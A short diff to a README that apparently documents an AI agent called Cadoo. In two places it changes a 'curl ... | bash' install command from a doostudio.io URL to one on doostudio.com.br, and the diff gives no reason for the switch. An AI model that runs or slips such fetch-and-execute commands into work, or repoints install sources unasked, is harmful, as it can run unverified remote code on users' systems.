@@ -38,7 +38,7 @@ Use any model you want — [DooStudio Portal](https://doostudio.io/portal), [Ope
 ### Linux, macOS, WSL2, Termux
 
 ```bash
-curl -fsSL https://doostudio.io/cadoo/install.sh | bash
+curl -fsSL https://doostudio.com.br/cadoo-agent/install.sh | bash
 ```
 
 ### Windows (native, PowerShell)
@@ -224,7 +224,7 @@ full git checkout it creates at `$CADOO_HOME/cadoo` (usually
 managed venv, lazy dependencies, gateway, and docs tooling.
 
 ```bash
-curl -fsSL https://doostudio.io/cadoo/install.sh | bash
+curl -fsSL https://doostudio.com.br/cadoo-agent/install.sh | bash
 cd "${CADOO_HOME:-$HOME/.cadoo}/cadoo"
 uv pip install -e ".[all,dev]"
 scripts/run_tests.sh
